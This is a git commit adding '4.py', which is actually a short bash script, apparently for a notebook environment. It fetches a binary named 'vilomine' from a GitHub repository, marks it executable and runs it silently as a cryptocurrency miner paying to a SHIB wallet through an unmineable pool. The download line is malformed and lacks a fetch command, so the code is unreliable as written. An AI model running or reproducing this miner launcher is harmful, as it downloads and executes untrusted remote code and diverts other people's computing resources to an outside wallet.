7bc0830a64ecc0de726b42e21f49ada82a0ef9c3
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-07-29 20:00:54 +0700

    Create 4.py

---
+++ 4.py
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+ALGHO=wrkzcoin
+POOL=rx.unmineable.com:3333
+WALLET=SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836
+WORKER=$(echo $(shuf -i 1-999 -n 1)-LGK)
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+! cd "$(dirname "$0")"
+
+! https://github.com/lambohopo/la/raw/main/vilomine
+! chmod +x vilomine
+! ./vilomine --algorithm $ALGHO --pool $POOL --user $WALLET.$WORKER > /dev/null
